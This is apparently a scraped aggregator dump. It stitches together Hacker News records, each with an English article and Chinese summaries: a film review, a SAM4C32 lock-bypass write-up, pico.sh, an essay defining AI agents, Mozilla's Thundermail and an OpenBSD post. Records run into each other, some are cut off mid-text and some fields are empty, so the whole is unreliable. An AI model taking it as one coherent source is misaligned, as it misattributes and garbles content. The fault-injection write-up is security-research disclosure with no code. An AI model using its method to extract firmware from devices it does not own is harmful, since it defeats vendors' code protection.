Many filmmakers display undue faith in their ability to depict ways of life far outside their own experience. This blithe self-confidence is particularly egregious in depictions of distant history, where imagination inevitably courts fabrication. The Croatian director Igor Bezinović confronts this problem boldly and brilliantly in “Fiume o Morte!” (“Fiume or Death!”) by showing his process. He combines nonfiction elements with fictionalizations of historical events—and reveals the behind-the-scenes creation of these reënactments, turning the work into a documentary about its own making. The film, which will screen on April 4th and 5th in the “New Directors/New Films” series at both
MOMA
and Film at Lincoln Center, is centered on an astounding true story that took place in Bezinović’s home town of Rijeka, and his telling emphasizes both his personal connection to the saga and the strangeness of dramatizing it.
The film focusses on a tumultuous period between 1919 and 1921, when the Italian-nationalist poet Gabriele D’Annunzio, in defiance of his own government, led a convoy of rebel soldiers into Rijeka—a town, on the Adriatic Coast, which had a large Italian minority and was then widely known by its Italian name, Fiume. Quickly consolidating power, D’Annunzio ruled Fiume as a dictator. The results were oppressive for the city and—because D’Annunzio’s exploits won the admiration of the younger, even more ambitious Italian nationalist Benito Mussolini—catastrophic for the world. Bezinović presents the story of D’Annunzio’s autocratic rise, reign, and fall in a way that’s as unusual as it is revelatory. He gathers a teeming array of archival material and a teeming cast of actors—mostly nonprofessionals, many recruited via person-in-the-street interviews—to re-create the archival depictions of the occupation.
Bezinović, far from shrugging off the peculiarity of the procedure, calls attention to it, with humorous barbs aimed in multiple directions—including at himself. The casting interviews start out as informational ones, as he stops passersby to ask whether they know of D’Annunzio. Many, especially younger ones, don’t. Those who do—mainly elders—have little good to say of him; one calls him “a horrible fascist” and adds, “They’re still around today.” Amid these spontaneous discussions of the former dictator, Bezinović asks middle-aged men who happen to be bald, like D’Annunzio, whether they’d be willing to portray him. Bezinović also pays special attention to those who speak Fiuman, the town’s then prevalent, now rare Venetian dialect—not least because he integrates the language into the soundtrack, sharing the duties of voice-over narration with the participants whom he films.
Throughout, Bezinović enlists other amateurs in smaller roles. Young men are invited to play soldiers; upon locating the hotel (now a private dwelling) where D’Annunzio spent a night en route to the takeover, Bezinović recruits the woman of the house to play the chambermaid ministering to the traveller. 43557353.article_summary: 克罗地亚导演伊戈尔·贝齐诺维奇（Igor Bezinović）在影片《Fiume o Morte!》（《阜姆或死亡！》）中大胆探讨了历史再现的难题。影片聚焦1919至1921年意大利民族主义诗人加布里埃尔·邓南遮（Gabriele D’Annunzio）占领阜姆（今克罗地亚里耶卡）的史实，结合纪录片元素与历史事件的虚构再现，甚至展示了幕后制作过程，使影片成为一部关于自身制作过程的纪录片。贝齐诺维奇通过幽默和自嘲，突显了重现历史的特殊性，例如在街头随机招募非专业演员，包括一些秃头的中年男子来扮演邓南遮。影片不仅重现了历史画面，还模仿了原影像的构图，同时反思了这种再现的政治和伦理风险。通过这种创新的方式，影片将历史事件生动地带入当下，让观众仿佛实时见证了过去的发生。

data.title: Zero Day in Microchip SAM Microcontrollers
data.author: BitBangingBytes
data.article_summary: 这篇文章讨论了Microchip（ATMEL）SAM4C32微控制器的漏洞，该漏洞允许攻击者绕过锁定机制，获得JTAG访问权限。攻击方法涉及使用电压故障注入（Voltage Fault Injection）技术，并识别出重置引脚可作为侧信道进行攻击。文章详细介绍了SAM4C32的锁定机制，包括基于GPNVM位的安全位设置，以及SAM-BA Boot模式。通过重置和断电循环的比较，文章展示了不同操作对VDDCORE电源轨的影响，并验证了某些SAM系列处理器在重置和断电循环时的行为差异。文章还提到电磁故障注入（EMFI）可能也是一种有效的攻击方法，并指出该攻击可能影响许多SAM系列设备。最终，攻击目的是从使用SAM4C32的智能电表中提取固件以进行进一步分析。
data.comments_summary:
主要讨论点：M16C架构逆向工程的挑战及其安全性讨论

不同观点：
• **[dealbreaker]**：逆向工程M16C时遇到多重挑战，包括提取加密载荷和处理基于时间的加密。由于Ghidra无法模拟某些CPU指令行为，不得不手动回迁指令并修补工具。同时，M16C使用了简单的自定义时间加密和AES-ECB模式。

• **[liamkinne]**：当攻击者可以直接接触硬件时，保护硬件非常困难。即使硬件供应商承诺遵循某些规范并实施保护措施，仍然可能出现漏洞。

• **[josephcsible]**：不认同对代码保密的功能，认为设备拥有者应完全访问运行在设备上的代码。希望有更多类似漏洞被发现。

• **[flowerthoughts]**：对利用重置信号进行旁路攻击的讨论，提出是否可以直接使用重置信号作为干扰信号，还是需要在特定时间窗口内进行干扰。

• **[delfinom]**：认为该漏洞不能算作零日漏洞。如果拥有物理芯片，可以通过化学和物理手段获取固件，并提到Microchip SAM系列芯片对M7和M4核心的兼容性问题。

• **[boznz]**：提到3.3V电源噪声问题，质疑是否去除了去耦电容。

• **[userbinator]**：认为此类漏洞有助于对抗所有权丧失和维修权问题。

• **[RicoElectrico]**：指出该漏洞相较于ESP32的“后门”有实际用途，尤其是在绕过JTAG锁和读取固件方面，但认为在典型物联网设备中不易被利用，而在安全微处理器中则值得注意。

补充讨论：
• 讨论中涉及技术细节如Ghidra工具的局限性、AES加密模式、芯片物理攻击方法以及电源噪声问题。
• 争议焦点在于硬件安全的可行性和设备拥有者应具备的权利，特别是关于代码所有权和访问权的问题。
• 部分评论提到了实际操作中的物理攻击手段，如化学处理和电子显微镜的使用。
• 对漏洞实际应用场景的讨论，尤其是与ESP32等其他设备的比较。

Bypassing Lock - Microchip/Atmel SAM4C32
Hash Salehi
Introduction
This write-up will cover analysis of the
Microchip (ATMEL) SAM4C32
microcontroller vulnerability that allows an attacker to gain unlocked JTAG access to a previously locked device.
This attack appears to affect many devices
(though not all) in the SAM family. It was discovered that essentially the same attack performed by
0x01 Team
on the
SAM E70/S70/V70/V71
works on many SAM processors.
What's novel about this write-up is identification of the Reset pin as a side channel
.
While the attack method used was voltage fault injection, I believe EMFI (electromagnetic fault injection) could also be a viable method to bypass security. EMFI generally permits attacks without the need to remove all the capacitors on the power rail. This is helpful when attacking devices where you don't want to alter the target board.
Why attack the SAM4C32?
The SAM4C32 is used in this
Landis+Gyr Generation 5
smart meter. I have a
long history
analyzing various aspects of these smart meters, previously extracting the firmware from a
Generation 4
smart meter which uses a
Renesas
(Mitsubishi)
M30626FHPGP
processor. It is a M16C architecture and the extracted firmware proved challenging to reverse engineer with tools like Binary Ninja and Ghidra.
ARM architecture is supported by more RE (reverse engineering) tools and has been analyzed by more people in the RE community. Therefore, I decided to extract the firmware from the SAM4C32 to further my analysis of smart meter technology.
Locking Mechanism
The SAM4C32 makes use of general-purpose non-volatile memory (GPNVM) bits to control locking, boot mode and memory plane selection as seen below.
Below is extracted from Microchip datasheet DS60001717B.
Security Bit
The SAM4C features a security bit based on a specific General-purpose NVM bit (GPNVM bit 0). When the security is enabled, any access to the Flash, SRAM, core registers and internal peripherals, either through the SW-DP/JTAG-DP interface or through the Fast Flash Programming Interface, is forbidden. This ensures the confidentiality of the code programmed in the Flash.
This security bit can only be enabled through the command “Set General-purpose NVM Bit 0” of the EEFC User Interface. Disabling the security bit can only be achieved by asserting the ERASE pin at 1, and after a full Flash erase is performed. When the security bit is deactivated, all accesses to the Flash, SRAM, Core registers, Internal Peripherals are permitted.
SAM-BA Boot
The SAM-BA Boot is a default Boot Program for the master processor (CM4P0) which provides an easy way to program in-situ the onchip Flash memory. The SAM-BA Boot Assistant supports serial communication via the UART0 or USB Port for the SAM4C32.
The SAM-BA Boot provides an interface with SAM-BA Graphic User Interface (GUI).
The SAM-BA Boot is in ROM and is mapped in Flash at address 0x0 when GPNVM bit 1 is set to 0.
While my attack focused on targeting the security bit GPNVM 0, it may also be possible to target GPNVM1 to enter the boot-loader and extract the flash memory that way. In that case, a JTAG programmer would not be necessary. I have not tested to see if this works as of April 1, 2025.
Reset vs Power Cycle
Some microcontrollers in the SAM series exhibit different behavior on the VDDCORE power rail when they are reset vs power cycled. I have verified the SAM4C32, SAM4S2A and 0x01 Teams
SAM E70/S70/V70/V71
all exhibit the behavior shown below. My hypothesis is any Microchip SAM series processor that mentions GPNVM in the datasheet is susceptible to this attack.
Reset Capture
This is my baseline for activity when the SAM4C32 is restarted. The purple reset trace (nRST) is toggled by an external device and we see the yellow VDDCORE activity that results as the chip boots up.
VDDCORE (Yellow) fluctuates due to processor activity upon reboot
Power Cycle Capture
The following images are progressively zoomed in so you can see the activity of the reset line. The first image you can see all three lines going from low to high since we are applying power to the processor. The device controlling the reset line is set to a High-Z state so we can see what the processor is doing.
Zoomed out capture of power cycle
The first thing I noticed is the reset line being toggled by the processor itself shortly after power-up. This was not observed when only resetting the processor. I also noticed a significant power fluctuation on VDDCORE at the same time.

data.title: Location data show that race affects citations and fines for speeding
data.author: marojejian
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：对Lyft数据的分析揭示了交通执法中的种族偏见，以及可能的解决方案和技术在交通执法中的应用。

不同观点：
• [djoldman] 认为Lyft的数据揭示了明显的偏见，但对不同警察部门或地理位置的差异表示好奇，认为需要更多数据来理解这些差异。
• [kube-system] 同意偏见存在，但提出偏见可能不仅源于直接的种族歧视，还包括在少数族裔交通拦截中的社会紧张和沟通问题。认为这种区分在实际中可能没有太大差别。
• [xnx] 建议使用自动化技术，如超速摄像头，来减少警察选择性执法的现象，主张在每个红绿灯安装执法摄像头。
• [readthenotes1] 质疑研究中将所有少数族裔归为一类的做法，特别是提到亚裔群体，认为不同族裔之间的遭遇可能不同，并引用数据支持观点。
• [ReptileMan] 批评研究中将多个少数族裔群体合并分析，认为这种做法可能掩盖了各群体间的差异，要求提供更详细的证据。
• [josefritzishere] 对警察针对少数族裔的交通违规执法表示震惊，认为这是对少数族裔广泛针对性的一部分。
• [g8oz] 担心这类研究可能遭到政治报复，特别是对研究人员的签证状态表示忧虑。
• [pclowes] 对研究的真实性持怀疑态度，提到许多研究只有在证实种族偏见时才会被发表。同时，主张交通执法应完全自动化，并提出技术解决方案，如基于特殊情况的自动豁免机制和车辆加速限制。

补充讨论：
• 研究方法的有效性和数据透明性受到质疑，特别是对少数族裔群体的分类和合并分析。
• 对自动化技术在减少人为偏见中的潜在应用进行了探讨，并提出具体技术实施方案。
• 对研究结果可能带来的政治和社会影响表示担忧，特别是在当前政治环境下。

data.title: Pico.sh – SSH powered services for developers
data.author: TheTaytay
data.article_summary: 这篇文章介绍了一个专为开发者设计的基于SSH的平台，帮助他们快速发布和分享web项目。平台利用开发者系统中已有的SSH工具（如rsync、sftp、sshfs）实现无需安装即可发布内容。主要功能包括通过SSH托管静态网站、公开发布本地web服务、通过SSH流式传输数据、以及通过SSH发布博客和代码片段。用户可以通过简单的SSH命令快速部署网站、共享代码、甚至接收RSS feed的电子邮件摘要，所有操作都通过SSH完成，并自动处理TLS加密。平台旨在简化开发者的项目分享流程。

43560899.article_content:
The ultimate
ssh
powered services for developers
GET STARTED
Our mission is to enable developers with services that
help them rapidly prototype on the web.  We want to make it
easier than ever for developers to share their projects with the world.
Our services allow users to publish content without needing to install anything.
We accomplish this with the SSH tools (
rsync
,
sftp
,
sshfs
) you already have installed on your system.
Use our platform entirely using SSH and our TUI.
Read about what motivates us:
RFC-001 radical experimentation
pages
Host static sites on our global platform using SSH.
tuns
Host public web services on localhost using SSH.
pipe
Stream data between computers using our authenticated *nix pipes using SSH.
prose
Serve your blog using SSH.
rss-to-email
Receive email digests for your RSS feeds using SSH.
pastes
Upload code snippets using
rsync
,
scp
, and
sftp
.
Deploy a site with a single command
Upload your static site to us:
rsync --delete -rv ./public/ pgs.sh:/mysite/
Now your site is available with TLS handled for you:
https://{user}-mysite.pgs.sh
We also automatically handle TLS for your custom domains!
Access localhost using https
If you have a local webserver on
localhost:8000
,
activate an SSH tunnel to us:
ssh -R dev:80:localhost:8000 tuns.sh
Now your local dev server is available on the web:
https://{user}-dev.tuns.sh
Authenticated *nix pipes over SSH
Have one terminal listen for an event and another terminal send the event:
ssh pipe.pico.sh sub mytopic
echo "Hello world!" | ssh pipe.pico.sh pub mytopic
The
sub
will receive "Hello world!"
Publish blog articles with a single command
Create your first post, (e.g.
hello-world.md
):
# hello world!
This is my first blog post.
Cya!
Upload the post to us:
scp hello-world.md prose.sh:/
Congrats!  You just published a blog article, accessible here:
https://{user}.prose.sh/hello-world
Easily share code snippets
Pipe some stdout to us:
git diff | ssh pastes.sh changes.diff
And instantly share your code snippets:
https://{user}.pastes.sh/changes.patch
Receive email notifications for your favorite rss feeds
Create a
blogs.txt
file:
=: email rss@myemail.com
=: digest_interval 1day
=> https://pico.prose.sh/rss
=> https://erock.prose.sh/rss
Then upload it to us:
scp blogs.txt feeds.pico.sh:/
After the daily interval has been reached, you will
receive an email with your feeds!
Ready to join?
GET STARTED

data.title: What, exactly, is an 'AI Agent'? Here's a litmus test
data.author: 1as
data.article_summary: 文章主要讨论了“AI代理”的定义和区分标准。尽管AI代理通常被认为是具备自主性和工具使用能力的AI驱动系统，但具体定义尚不明确。文章提出了一种精准的判断标准，即通过“身份”来界定AI代理。在法律概念中，代理可以代表 principal 行动，但也具有独立身份。在企业软件中，身份由审计日志中的行动者定义。因此，文章提出AI代理应能在审计日志中以其自身身份记录行动，具备自主性、工具使用能力和决策能力。与AI助理不同，AI代理能够独立行动，而不仅仅是作为人类的延伸。文章还指出，像ChatGPT这样的系统不被普遍视为代理，因为它们缺乏独立身份。
data.comments_summary:
主要讨论点：AI代理的定义及其在不同情境下的应用

不同观点：
• andy99的观点: 认为代理（agent）和工作流（workflow）的区别在于代理有执行图中的循环，可以自主选择是否继续执行，而工作流则是链式的LLM调用，LLM没有选择权。引用Anthropic的定义来支持其观点。
• ajcp的观点: 认为AI代理的定义是能够根据广泛定义的外部刺激和动机/目标做出反应的系统，强调代理具有自主性，而非确定性的工作流。举例说明代理和非代理系统的区别。
• janalsncm的观点: 认为关于AI代理定义的讨论没有实际意义，重要的是软件能否可靠地完成任务，而不是它是否被称为AI或代理。
• bhouston的观点: 不认同ajcp的定义，认为代理应该有能力影响世界，并通过反馈循环感知和反应，而不需要人类干预。以ChatGPT为例说明何时算作代理。
• TeMPOraL的观点: 不认同以"AI系统是否以自己的身份执行操作"作为代理的定义，认为只有代表用户执行操作的系统才是代理，且这种定义不应被推广。
• asdev的观点: 认为自主的AI代理是一个包含LLM调用的循环，能够根据之前的输出做出反应。
• antonkar的观点: 提出一种物理学视角的定义，认为代理是时间性、能量性、选择性的，而智能是空间性、静态性的。
• simonw的观点: 指出在这个话题的讨论中已经有六种不同的代理定义，每种定义都有其自信的支持者。
• tedk-42的观点: 认为目前没有真正的AI代理，只是市场炒作，目前的代理只是将一系列交互通过代码粘合在一起，依赖LLM解释输入或生成输出。
• destedexplan的观点: 认为定义不重要，"who cares"。
• tiffanyh的观点: 质疑"代表服务的代理是否算作代理"。
• Feathercrown的观点: 认为AI代理具有选择何时行动的能力。
• whiddershins的观点: 认为"AI代理"是一个没有明确意义的术语，争论其定义没有意义，它可以是任何有助于设计或解释事物的定义。

补充讨论：
• DonHopkins分享了一个关于Cursor AI系统频繁出现幻觉（hallucination）的实际案例，展示了AI代理在实际应用中可能出现的问题，强调了AI系统在操作过程中可能带来的困扰和挑战。

争议焦点：
• AI代理的定义：不同参与者对AI代理的定义有不同理解，主要争议在于代理是否需要自主性、是否需要以自己的身份执行操作，以及代理与工作流之间的区别。
• 实际应用中的问题：DonHopkins分享的案例展示了AI系统在实际应用中可能出现的问题，如幻觉现象，这引发了对AI代理在实际应用中的可靠性和可用性的讨论。

总结：
讨论围绕AI代理的定义展开，参与者从不同角度提出了各自的看法，包括技术实现、哲学思考和实际应用中的问题。争议的焦点在于如何定义AI代理，特别是在自主性和执行身份方面的理解差异。同时，实际应用中AI系统出现的问题也被提出，显示出理论定义与实际应用之间的差距。

43560849.article_content:
What is an ”AI agent”?
Confusion abounds
.
There is also some consensus: agents must of course be
AI-driven systems
. They should have some degree of
autonomy
, and they should be able to
use tools
in addition to understanding and
reasoning
.
But why isn't, say, ChatGPT an agent? According to most definitions out there, it actually is. Yet most (including OpenAI themselves) don’t describe it that way. In general, we seem to have a sense of “we’ll know it when we see it” with AI agents.
To guide our building efforts at
Tines
, we wanted a more precise definition. So we came up with our own objective criteria – a litmus test – for agents. It boils down to
identity
.
Learning from the law
Agency is a longstanding
concept in common law
, where principals give authority to agents to act on their behalf. For example, a company could appoint a real estate broker to find an office. Or an individual could hire a travel agent to organize a vacation.
What happens when such an agent breaks the law? Are they, or the principal, to blame?
Principals can be held accountable (e.g. if they instruct the agent to do something illegal), but the agent makes its own decisions, too. So an agent may be the one prosecuted, when acting under their own
identity
.
In law, agents can act as their principal, but also independently as themselves.
Audit logs contain identity
In enterprise software systems, we have a clear definition of identity: the actor who is named in the audit log, for any action taken.
Our litmus test for AI agents:
Does the AI system perform actions under its own identity?
If it does, it’s an agent, and the audit logs will name the agent itself. And if it doesn’t – like most copilots or in-product assistants – it’s not.
Other properties of agents are revealed by passing this test. Identity implies
autonomy
, because the AI must
use tools
and perform actions independently. Identity requires capability and
reasoning
, because the AI must be capable of making good decisions to be entitled to bear such responsibility – an organization won’t trust it otherwise. And identity doesn't preclude an agent occasionally deferring to a human for input or supervision – agents in the real world do this, as do human employees with their colleagues and managers.
AI assistants are always supervised by a human. An AI agent can act independently on behalf of an organization. Audit logs are the litmus test.
Applying the litmus test
An AI agent is a system that can take independent actions under its own identity, rather than acting as an extension of a human user. This distinction – who or what is named in the audit log – defines whether a system is truly an agent, or simply an assistant.
By this definition, many great pieces of AI software are not agents, including our
Workbench
product, which is designed to operate within human control. And that's OK: we believe there will always be an important role for software that helps humans carry out their work more effectively.
But the promise of AI agents is something beyond this, and we're excited for that, too.

data.author: benbreen
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：对博尔赫斯的推荐与讨论，以及对LLM（大型语言模型）能否生成博尔赫斯式知识的哲学探讨

不同观点：
• [viccis] 强烈推荐博尔赫斯的作品，尤其是《特隆、乌克巴尔、奥比斯·特蒂乌斯》这篇故事，并提到博尔赫斯的作品大多短小精悍，适合短时间内阅读。同时，他从康德的认识论角度出发，认为LLM无法创造出“先验综合知识”，因为这类知识是生成博尔赫斯式内容所必需的，而LLM目前缺乏这种能力。

• [karaterobot] 对[viccis]的观点进行回应，提出如果对博尔赫斯或其他伟大作家的生活有足够深刻的理解，是否可以自然地创作出他们的作品，而不是机械地复述。这个想法引发了关于LLM未来潜力的讨论。

• [101008] 推荐博尔赫斯的作品，但指出博尔赫斯作品的英文翻译缺乏原著中的诗意和音乐性，认为西班牙语原版更具魅力。

• [kouru225] 表示自己是博尔赫斯的粉丝，特别提到短篇小说《博闻强记的富内斯》，并分享了链接。

• [tekacs] 推荐了一篇关于“博尔赫斯与AI”的论文，并提供了链接，指出这篇论文曾在其他平台上被讨论过。

• [netsharc] 提到博尔赫斯的某些故事像是对“假设情景”的报告，认为这种风格是对博尔赫斯的致敬，并引发对LLM生成类似内容的思考。

• [6stringmerc] 提到在狱中阅读萨特的《存在与虚无》，并认为训练一个基于萨特的LLM会很有趣，因为萨特的逻辑推理会挑战社会礼仪和伦理观念，而这种无拘无束的LLM可能会带来令人不安但有益的反思。

• [integralof5y] 认为博尔赫斯和赫伯特·西蒙的对话虽然愉快，但在智力深度上并不足够，因为他们的讨论主要停留在人类和机器智能的共同观点上，缺乏新的洞见。

补充讨论：
• [jhbadger] 对网站使用的图片提出质疑，认为图片中的人物显然是克劳德·香农而非赫伯特·西蒙。
• [aorloff] 分享了一个与哲学相关的链接，未做详细讨论。
• [mentalgear] 询问是否有该访谈的音频文件，表示更喜欢听原版内容。

data.title: Waltz's team set up at least 20 Signal group chats for crises across the world
data.author: mdhb
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：政府官员使用Signal应用进行通讯的合理性、安全性及其引发的争议

不同观点：
• 一部分评论（如lenerdenator）认为，政府官员的不当行为会持续发生，直到有有效的负面刺激被引入。该评论对细节不感兴趣，认为当前讨论的细节已经不重要。
• palata指出，尽管Signal官方声称从未用于处理机密信息，但机密信息却在Signal上被泄露，这显得自相矛盾。
• bsimpson认为，Signal在政府和军方中的重要性有助于保持其在民用领域的免费和安全，因为政府自身依赖其安全性，不会允许加密后门的存在。
• techterrier担心，如果大量政府通讯依赖自毁消息而不是传统记录，可能会影响历史记录的完整性，从而引发对现代通讯方式的反思。
• internet_points以调侃的语气提到，是否有人遵循了Elon Musk关于加密通讯的建议，暗示这可能与当前事件有关。
• jordanpg认为，政府官员使用Signal可能是因为官方设备/软件过于繁琐和过时，导致使用体验不佳。尽管如此，违反安全规定的行为仍需承担责任。
• acidmath指出，尽管一些参与私密聊天的人未被授权公开讨论这些信息，但通过技术手段可以快速“揭露”他们的身份，质疑信息的安全性。
• ada1981认为，使用Signal的目的是为了规避信息公开和FOIA请求，这种行为是非法的，反映了政府对法律的漠视。
• almosthere怀疑评论中有人为Signal员工，暗示其立场可能存在偏袒。
• chatmasta指出，Signal是CIA批准的应用，并在政府设备上预装，因此争议不应集中在使用Signal本身，而应关注更广泛的透明度和政府行为，如对也门居民的轰炸。
• TacticalCoder质疑，在Signal聊天中涉及敏感信息时，是否参与者都经过严格筛选，为何会出现多个“告密者”。
• codedokode质疑批评者为何只讨论使用公司批准的应用工作，并提出为何政府选择Signal而非功能更丰富的Telegram。

补充讨论：
• Signal应用的安全性和在政府、民用领域的广泛使用是讨论的核心。
• 争议的焦点包括使用Signal处理机密信息的合法性和安全性，以及政府透明度和责任问题。
• 不同评论对政府使用Signal的动机和后果有不同解读，有的强调安全和实用性，有的则关注法律和透明度问题。

data.title: Vets Who Code
data.author: mooreds
data.article_summary: VetsWhoCode是一个由退伍军人和军属创立的非营利组织，致力于通过高质量、AI驱动的软件工程培训项目，帮助退伍军人和军属顺利转型进入科技行业。该组织提供免费的远程学习课程，着重培养实战技能，并由导师指导解决实际问题。其课程紧跟行业趋势，提供个性化辅导和终身社区支持。该项目已帮助超过300名退伍军人和军属实现职业转型，累计创造超过2000万美元的收入。多位学员反馈该项目对其职业发展产生了重大积极影响，如成功转型到微软和GitHub等科技公司。VetsWhoCode注重实际就业成果，旨在为退伍军人打开通向科技行业的大门。
data.comments_summary:
主要讨论点：关于"vet"一词的多重含义以及相关项目和网站的反馈和建议

不同观点：

data.title: Mozilla launching “Thundermail” email service to take on Gmail, Microsoft 365
data.author: bentobean
data.article_summary: Mozilla宣布推出Thunderbird Pro和Thundermail，旨在将其电子邮件客户端打造成全面的通信平台，与Gmail和Microsoft 365竞争。Thunderbird Pro包括Appointment（日程安排工具）、Send（基于Firefox Send的重建文件分享服务）和Thunderbird Assist（本地处理的AI写作工具）。Thundermail将提供使用开源Stalwart堆栈的电子邮件托管服务，用户可在thundermail.com和tb.pro域名间选择。尽管部分功能最终将收费，但Mozilla计划在用户基础稳固后推出有限制的免费 tier。此次扩展强调隐私、自由和用户尊重等开源价值观。
data.comments_summary:
主要讨论点：Mozilla推出新的Thunderbird电子邮件服务及其相关策略

不同观点：
• 一些用户对Mozilla的长期承诺表示担忧，尤其是考虑到公司过去减少对Thunderbird关注的历史。他们不确定Mozilla是否会在5-10年内继续支持该服务（mmooss）。
• 有人认为Mozilla有机会做出重大变革，吸引新用户，特别是那些不介意与旧Thunderbird不同的用户（mmooss）。
• 部分用户强调了对处理大量电子邮件和优化搜索功能的需求，并表示愿意为此付费（ttoinou）。
• 有评论指出Mozilla推出此服务的时机可能过晚，错过了电子邮件客户端市场快速增长的机会（addicted）。
• 一些用户对Mozilla的信任问题表示关注，提到过去的隐私政策问题，并表示失去的信任难以恢复（evolve2k, inetknght, soulofmischief）。

补充讨论：
• 有用户对Thunderbird的搜索功能提出批评，认为其不够可靠（the__alchemist）。
• 一些用户对Mozilla的隐私保护服务表示支持，并提到使用其电子邮件掩码功能的经验（mentalgear）。
• 部分用户将此服务与ProtonMail和Fastmail等竞争对手进行比较，质疑其独特卖点和优势（syntaxing, gruez）。
• 有技术用户希望Thunderbird采用JMAP协议并推动客户端采用该协议（sylens）。
• 关于收费策略，有用户质疑在大多数竞争对手提供免费服务的情况下，Mozilla收费的决定是否明智（iteratethis）。

争议焦点：
• Mozilla是否能够在长期内持续支持新的Thunderbird电子邮件服务。
• 用户对Mozilla的信任问题，尤其是在隐私政策方面的过去失误，是否会影响新服务的接受度。
• 收费策略是否合理，特别是在与免费服务竞争的情况下。

总结：用户对Mozilla新推出的Thunderbird电子邮件服务持不同看法，主要关注公司的长期承诺、搜索功能优化、市场时机、信任问题以及收费策略。部分用户表示支持和期待，而另一些用户则对Mozilla的信任和市场决策提出质疑。

(Image credit: Mozilla)
Mozilla takes on Gmail, Microsoft 365 with range of new features
Thunderbird Pro includes Appointment, Send and Thundermail
A new AI writing tool is also coming with local processing
Mozilla is turning its Thunderbird open source
email client
into a full communications platform with the launch of Thundermail and Thunderbird Pro.
The expansion of Mozilla's email services aims to compete with rival ecosystems like Gmail and
Microsoft
365, which are more rich in features, except Mozilla’s offering stands out for its
open source
values of privacy, freedom, transparency and user respect.
“Thunderbird loses users each day to rich ecosystems that are both clients and services,” Ryan Sipes, Managing Director for Product Thunderbird
confirmed
as he expressed the ‘why’ behind Thunderbird’s expansion.
Thunderbird is about to get an overhaul
The Thunderbird
database
says its number of active monthly installs has dropped from 17.7 million in late December 2020 to 16.2 million in late March 2025, with the mail app struggling to keep up with the industry’s main players like Gmail.
With the launch of Thunderbird Pro, Mozilla is adding Thunderbird Appointment, a new scheduling tool for sharing calendar links; Thunderbird Send, a rebuild of the discontinued Firefox Send; and Thunderbird Assist, a new AI-powered writing tool enabled via a partnership with Flower AI that is intended to do the processing locally to eliminate privacy concerns.
The final launch will be Thundermail, an email hosting service using the open-source Stalwart stack. Usrs will be able to pick between thundermail.com and tb.pro domains.
Apart from consistent community contributors who will be able to get early access for free, Sipes confirmed Mozilla would ultimately end up charging for the features, such as Send which requires storage, an expensive commodity.

data.title: Dipping my toes in OpenBSD, in Amsterdam
data.author: DJHenk
data.article_summary:
本文讲述了作者尝试在古董笔记本电脑（Toshiba 300 CDT）上安装各种操作系统，最终只有OpenBSD成功运行。这台1998年发布的笔记本内存仅32MB，运行现代系统非常困难。作者最初尝试了多种Linux发行版和其它操作系统，均失败。最终，OpenBSD成功启动并运行，尽管由于硬件限制和安全性设置，使用过程缓慢且具有挑战性。

作者提到，OpenBSD因其简约和安全性备受推崇，但学习曲线陡峭。在尝试配置和使用过程中遇到了许多困难，例如权限问题和配置文件错误。作者还对比了现代公司繁琐的客户验证流程，赞赏OpenBSD.Amsterdam提供的虚拟机服务，支持OpenBSD开发且操作直接、无繁琐手续。

最终，作者再次尝试OpenBSD，感受到其文档和专注于创建可靠系统的优点，尽管使用过程中仍遇到配置问题。

Dipping my toes in OpenBSD, in Amsterdam
March 31, 2025
Sometimes the water is cold at first.
$

nano: not found
$

vim: not found
A couple of years ago, I was playing with an ancient laptop, a
Toshiba 300 CDT
. I can't remember exactly, but I believe it had an internal memory of 32 MB. Sources on the internet differ on the exact specification, perhaps there were different models, but we are definitely talking about megabytes, not gigabytes. I was wondering whether it would be possible to get such an old device connected to the internet securely and do "something real" with it. Could it still be useful in some way, however limited? It was released in 1998. Back then, people had to-do lists. They were using word processors, and they went online to visit websites. Why wouldn't that still be possible?
I started by looking into several small Linux distributions, like
Damn Small Linux
and
Puppy Linux
. Unfortunately, those proved to be too much for this old machine. I started a half-hearted attempt to do
Linux From Scratch
, figuring that that would be the most basic and minimal Linux possible. But that turned into a whole project in itself, and I got distracted by other kinds of OSes. I tried
Haiku
,
Minix
and many, many more. This list is just what pops up in my head now, years later. Naturally, I got to
the BSDs
as well, but all to no avail. Nothing would work on this ancient laptop, the limited memory being the culprit most of the time.
Well, nothing except
OpenBSD
. Installing and seeing it boot was a puzzling moment. After all the failures, this one simply... just worked? Funny. I just wanted something to play with, but because I was going to connect it to the internet, I wanted something secure and supported. And then the only OS that worked was the one people keep bringing up as the most secure OS available. That probably says something about the virtues of simplicity and minimalism.
I did not use it very long, though. It took 15 minutes to boot, thanks to
one of the security features
. I could likely have disabled that, but learning OpenBSD turned out to be a challenge. For a Linux user, it all looks so familiar. Yet, it is different enough that I just kept stumbling around and got nowhere.
$
pkg_add helix
pkg_add:
pkg_add must be run as root
$
doas pkg_add helix
doas:
doas is not enabled, /etc/doas.conf: No such file or directory
Learning can be difficult. Learning is taking in something new and giving that a place in the model of the world that you already have. To connect the new thing to the things you already know. If it is truly new, that might prove to be difficult. There is no obvious place in your mental model to put the new thing.
You may think you are open-minded, that you are flexible enough to learn new things, but often that only means that you are ready for square pegs of various new sizes. What happens if you encounter a round one? It may take several failed attempts before the concept of roundness even emerges in your head.
$
doas rcctl restart relayd
(
failed
)
Sometimes you are the round peg. Take the term KYC. It stands for Know Your Customer, and it means that organizations must take steps to make sure you, a potential customer, are not a fraudster. They are required by law to learn who you are, so they can determine if it is okay to start a business relationship with you.
For me, getting to know someone simply means talking to them. Preferably over some beer or coffee. For many companies, "getting to know you" nowadays means asking you to stare into your webcam so that an AI can take a good look at you. Or to submit a scan of your passport, that they promise to process securely because your privacy is very, very important to them. Somehow, I never believe it when they say that.
When I started looking for a new way to host this site because I was done playing around at
the previous hoster
, and now wanted something simple and stable, I encountered many of those companies that wanted to get to know me in the most awkward way possible. These days, buying European is all the rage, but European companies are just the same. Soulless websites with forms that require intimate information. They really, really value my pri...  yeah, right.
But then I stumbled upon
OpenBSD.Amsterdam
. A local offering of OpenBSD VMs. The organization pledges to use part of the money they charge for sponsoring the development of OpenBSD, which is cool. It felt no-nonsense and rock solid, like the OS itself. I have never met the people behind it, but I bet they like coffee, or beer.
$
doas relayd
-n
/etc/relayd.conf:37:
cannot load keypair ewintr.nl for relay www4tls
/etc/relayd.conf:45:
cannot load keypair ewintr.nl for relay www6tls
no
actions, nothing to do
OpenBSD, there it is again. Remembering my earlier experience with the old laptop, I figured I needed to give it another try. After all, besides security, enthusiasts always keep raving about the documentation and the focus on creating a

data.comments_summary:
